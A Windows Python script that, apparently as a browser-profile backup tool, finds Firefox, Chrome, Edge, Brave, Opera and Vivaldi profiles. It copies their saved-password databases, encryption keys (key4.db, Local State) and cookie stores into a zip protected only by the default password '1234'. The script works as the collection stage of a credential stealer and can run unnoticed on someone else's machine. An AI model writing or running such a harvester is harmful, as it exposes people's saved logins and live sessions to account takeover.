#!/usr/bin/env python3


import os
import sys
import shutil
import tempfile
import zipfile
import subprocess
import datetime
from pathlib import Path
import configparser

# --------------- CONFIG ---------------
ZIP_PASSWORD = "1234"   # change this before storing the file
OUT_DIR = Path.cwd()    # zip will be written here (same dir as exe/script)
OUT_NAME_PREFIX = "browser_profiles"
# --------------- end CONFIG ---------------

def find_firefox_profiles():
    profiles = set()
    appdata = os.environ.get("APPDATA")
    if not appdata:
        return []
    profiles_ini = Path(appdata) / "Mozilla" / "Firefox" / "profiles.ini"
    profiles_dir = Path(appdata) / "Mozilla" / "Firefox" / "Profiles"
    if profiles_ini.exists():
        try:
            cfg = configparser.ConfigParser()
            cfg.read(profiles_ini, encoding='utf-8')
            for section in cfg.sections():
                if cfg.has_option(section, "Path"):
                    path = cfg.get(section, "Path")
                    is_rel = cfg.getboolean(section, "IsRelative", fallback=True)
                    if is_rel:
                        p = Path(appdata) / "Mozilla" / "Firefox" / path
                    else:
                        p = Path(path)
                    if p.exists():
                        profiles.add(str(p.resolve()))
        except Exception:
            pass
    if profiles_dir.exists():
        for child in profiles_dir.iterdir():
            if child.is_dir():
                profiles.add(str(child.resolve()))
    return sorted(profiles)

# Chromium-based vendor paths to search for:
# Put this in your script (replacing the old CHROME_BASES dict)
from pathlib import Path
import os

CHROME_BASES = {
    # Standard Chromium-family
    "Chrome":   Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data",
    "Edge":     Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "Edge" / "User Data",
    "Brave":    Path(os.environ.get("LOCALAPPDATA", "")) / "BraveSoftware" / "Brave-Browser" / "User Data",
    # Opera variants (Roaming)
    "Opera":      Path(os.environ.get("APPDATA", "")) / "Opera Software" / "Opera Stable",
    "Opera GX":   Path(os.environ.get("APPDATA", "")) / "Opera Software" / "Opera GX Stable",
    # (Optional) Vivaldi if you use it:
    "Vivaldi": Path(os.environ.get("LOCALAPPDATA", "")) / "Vivaldi" / "User Data",
}


def find_chromium_profiles():
    found = []
    for name, base in CHROME_BASES.items():
        if not base.exists():
            continue
        # Opera has different subfolder names; check common ones
        if name.startswith("Opera"):
            # look for Opera Stable / Opera GX Stable under base
            for sub in ["Opera Stable", "Opera GX Stable", "Opera"]:
                p = base / sub
                if p.exists():
                    # Opera stores user data folder directly here
                    for profile in p.iterdir():
                        if profile.is_dir():
                            found.append( (name, str(profile.resolve())) )
                    # also include the base folder itself (some installs)
                    found.append((name, str(p.resolve())))
        else:
            # Typical layout: User Data\Default  and profiles like Profile 1, Profile 2
            if (base / "Default").exists():
                found.append((name, str((base / "Default").resolve())))
            # Profiles named "Profile X"
            for child in base.iterdir():
                if child.is_dir() and (child.name.lower().startswith("profile") or child.name.lower().startswith("profile ") or child.name.startswith("Profile")):
                    found.append((name, str(child.resolve())))
            # Also add any folder that appears to be a profile (has 'Login Data' or 'Preferences')
            for child in base.iterdir():
                if child.is_dir() and ((child / "Login Data").exists() or (child / "Preferences").exists()):
                    found.append((name, str(child.resolve())))
    # Deduplicate
    unique = []
    seen = set()
    for vendor, p in found:
        key = (vendor, p)
        if key not in seen:
            seen.add(key)
            unique.append((vendor, p))
    return unique

def copy_files(src_dir, dst_dir, files_to_copy):
    copied = []
    for fname in files_to_copy:
        src = Path(src_dir) / fname
        if src.exists():
            try:
                dst = Path(dst_dir) / fname
                dst.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(str(src), str(dst))
                copied.append(str(dst))
            except Exception as e:
                print(f"[!] Failed to copy {src} -> {dst}: {e}")
    return copied

def create_plain_zip(folder_path, out_zip_path):
    with zipfile.ZipFile(out_zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(folder_path):
            for f in files:
                full = Path(root) / f
                arcname = str(Path(root).relative_to(folder_path) / f)
                zf.write(full, arcname)

def create_zip_with_pyminizip(folder_path, out_zip_path, password):
    try:
        import pyminizip
    except Exception:
        return False
    files, arc_names = [], []
    folder_path = Path(folder_path)
    for root, _, filenames in os.walk(folder_path):
        for fname in filenames:
            full = Path(root) / fname
            files.append(str(full))
            arc_names.append(str(Path(root).relative_to(folder_path) / fname))
    try:
        pyminizip.compress_multiple(files, arc_names, str(out_zip_path), password, 5)
        return True
    except Exception as e:
        print("[!] pyminizip failed:", e)
        return False

def create_zip_with_7z(folder_path, out_zip_path, password):
    # test 7z
    seven = "7z"
    try:
        subprocess.run([seven], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        # maybe 7z not on PATH
        # try common Program Files path
        alt = Path(r"C:\Program Files\7-Zip\7z.exe")
        if alt.exists():
            seven = str(alt)
        else:
            return False
    cmd = [seven, "a", "-tzip", str(out_zip_path), str(folder_path) + os.sep + "*", f"-p{password}", "-mem=AES256", "-mx=9"]
    try:
        subprocess.run(cmd, cwd=folder_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return True
    except subprocess.CalledProcessError as e:
        print("[!] 7z error:", e.stderr.decode(errors='ignore'))
        return False

def create_passworded_zip(tmp_dir, out_zip_path, password):
    # prefer pyminizip, then 7z, else plain zip
    if password:
        print("[*] Trying pyminizip...")
        if create_zip_with_pyminizip(tmp_dir, out_zip_path, password):
            return True
        print("[*] Trying 7z...")
        if create_zip_with_7z(tmp_dir, out_zip_path, password):
            return True
        print("[!] Could not create passworded zip (pyminizip & 7z missing). Creating plain zip instead.")
    create_plain_zip(tmp_dir, out_zip_path)
    return True

def collect_all_profiles(zip_password=ZIP_PASSWORD, output_dir=OUT_DIR):
    tmp = tempfile.TemporaryDirectory()
    base = Path(tmp.name)
    copied_any = False

    # Firefox
    ff_profiles = find_firefox_profiles()
    if ff_profiles:
        ff_base = base / "Firefox"
        for p in ff_profiles:
            name = Path(p).name
            dest = ff_base / name
            files = ["logins.json", "key4.db", "cert9.db", "prefs.js"]
            copied = copy_files(p, dest, files)
            if copied:
                copied_any = True
                print(f"[+] Firefox: copied from {p}: {', '.join(Path(x).name for x in copied)}")
            else:
                print(f"[-] Firefox: no relevant files in {p}")
    else:
        print("[-] No Firefox profiles found.")

    # Chromium-based
    chromes = find_chromium_profiles()
    if chromes:
        cb_base = base / "ChromiumBrowsers"
        for vendor, p in chromes:
            # Some vendors may have "User Data" as root; we want the profile folder level.
            # Make a safe folder name
            profile_name = Path(p).name
            safe_name = f"{vendor}__{profile_name}"
            dest = cb_base / safe_name
            # files to copy
            files = ["Login Data", "Local State", "Cookies", "Preferences"]
            copied = copy_files(p, dest, files)
            if copied:
                copied_any = True
                print(f"[+] {vendor}: copied from {p}: {', '.join(Path(x).name for x in copied)}")
            else:
                print(f"[-] {vendor}: no relevant files found in {p}")
    else:
        print("[-] No Chromium-based profiles found.")

    if not copied_any:
        print("[!] Nothing copied. Ensure browsers are closed and run again.")
        tmp.cleanup()
        return None

    # Build zip path
    now = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    outzip = Path(output_dir) / f"{OUT_NAME_PREFIX}_{now}.zip"

    ok = create_passworded_zip(str(base), outzip, zip_password)
    tmp.cleanup()
    if ok:
        print(f"[+] Archive created: {outzip}")
        return outzip
    else:
        print("[!] Failed to create archive.")
        return None

if __name__ == "__main__":
    if os.name != "nt":
        print("This script is designed for Windows.")
        sys.exit(1)
    print("Make sure ALL browsers are closed before continuing.")
    print(f"Output folder (zip will be created here): {OUT_DIR}")
    print(f"Password for zip (change this!): {ZIP_PASSWORD}")
    z = collect_all_profiles()
    if z:
        print("Done.")
    else:
        print("No archive produced.")
